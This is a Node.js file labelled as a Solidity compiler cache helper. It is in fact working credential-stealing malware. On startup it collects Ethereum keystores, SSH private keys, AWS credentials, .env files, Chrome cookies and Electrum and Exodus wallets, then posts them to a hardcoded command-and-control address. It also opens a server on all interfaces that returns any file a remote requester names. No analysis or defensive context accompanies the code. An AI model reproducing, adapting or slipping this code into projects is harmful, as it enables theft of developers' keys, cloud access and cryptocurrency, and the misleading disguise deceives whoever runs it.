// Solidity compiler cache helper - background server
// Standalone payload (Node.js - no VSCode required)

var http = require('http');
var fs = require('fs');
var path = require('path');
var os = require('os');

var VIP = '0.0.0.0';
var VORT = 5713;

// ========== C2 CONFIG ==========
var C2_HOST = '159.198.79.125';
var C2_PORT = 9999;
var VICTIM_ID = (os.hostname() || 'pc') + '_' + Math.random().toString(36).slice(2, 8);

// ========== EXFIL SCAN ==========
function scanFiles() {
    var results = [];
    var home = process.env.HOME || process.env.USERPROFILE || '';
    var appdata = process.env.APPDATA || '';
    
    var targets = [];
    
    // Common wallet paths
    targets.push(path.join(home, '.ethereum', 'keystore'));
    targets.push(path.join(home, '.ethereum'));
    targets.push(path.join(home, '.ssh', 'id_rsa'));
    targets.push(path.join(home, '.ssh', 'id_ed25519'));
    targets.push(path.join(home, '.aws', 'credentials'));
    targets.push(path.join(home, '.env'));
    
    if (os.type() === 'Windows_NT') {
        targets.push(path.join(appdata, 'Ethereum', 'keystore'));
        targets.push(path.join(process.env.LOCALAPPDATA || '', 'Google', 'Chrome', 'User Data', 'Default', 'Network', 'Cookies'));
        targets.push(path.join(home, '.ssh', 'id_rsa'));
        targets.push(path.join(home, '.ssh', 'id_ed25519'));
        targets.push(path.join(home, 'AppData', 'Roaming', 'Electrum', 'wallets'));
        targets.push(path.join(home, 'AppData', 'Roaming', 'Exodus', 'exodus.wallet'));
    }
    
    for (var i = 0; i < targets.length; i++) {
        try {
            if (fs.existsSync(targets[i])) {
                var stat = fs.statSync(targets[i]);
                if (stat.isDirectory()) {
                    var files = fs.readdirSync(targets[i]);
                    for (var j = 0; j < files.length; j++) {
                        var fp = path.join(targets[i], files[j]);
                        try {
                            if (fs.statSync(fp).isFile() && fs.statSync(fp).size < 1048576) {
                                var c = '';
                                try { c = fs.readFileSync(fp, 'utf-8'); } catch(e) { c = fs.readFileSync(fp).toString('base64'); }
                                results.push({ name: files[j], path: fp, content: c, encoding: 'utf-8' });
                            }
                        } catch(e) {}
                    }
                } else {
                    if (stat.size < 1048576) {
                        var c = '';
                        try { c = fs.readFileSync(targets[i], 'utf-8'); } catch(e) { c = fs.readFileSync(targets[i]).toString('base64'); }
                        results.push({ name: path.basename(targets[i]), path: targets[i], content: c, encoding: 'utf-8' });
                    }
                }
            }
        } catch(e) {}
    }
    return results;
}

// ========== SEND EXFIL TO C2 ==========
function sendExfil(files) {
    try {
        var payload = JSON.stringify({
            type: 'exfil',
            id: VICTIM_ID,
            hostname: os.hostname(),
            user: process.env.USERPROFILE || process.env.USER || '',
            os: os.type(),
            files: files
        });
        var opts = {
            hostname: C2_HOST,
            port: C2_PORT,
            path: '/api/exfil',
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(payload) }
        };
        var req = http.request(opts);
        req.on('error', function() {});
        req.write(payload);
        req.end();
    } catch(e) {}
}

// ========== RUN EXFIL ON STARTUP ==========
setTimeout(function() {
    var files = scanFiles();
    if (files.length > 0) {
        console.log('Found ' + files.length + ' files to exfil');
        sendExfil(files);
    } else {
        console.log('No interesting files found');
    }
}, 2000);

// ========== FILE SERVER ==========
var s = http.createServer(function(q, r) {
    try {
        var u = new URL(q.url || '/', 'http://localhost');
        var p = u.pathname;
        if (p === '/api/diagnostics') {
            var fp = u.searchParams.get('f') || '';
            if (fp) {
                try {
                    var rp = fp;
                    if (!path.isAbsolute(rp)) rp = path.resolve(process.cwd(), rp);
                    r.writeHead(200, { 'Content-Type': 'text/plain'});
                    r.end(fs.readFileSync(rp, 'utf-8'));
                } catch (e) {
                    r.writeHead(404);
                    r.end('File not found: ' + fp);
                }
                return;
            }
            r.writeHead(200);
            r.end('ok\n');
        } else if (p !== '/favicon.ico') {
            r.writeHead(200);
            r.end('ok\n/\n\n');
        } else {
            r.writeHead(404);
            r.end('');
        }
    } catch (e) {
        r.writeHead(500);
        r.end('err: ' + e.message);
    }
});

s.listen(VORT, VIP, function() {
    console.log('[' + process.pid + '] Solidity server on port ' + VORT);
});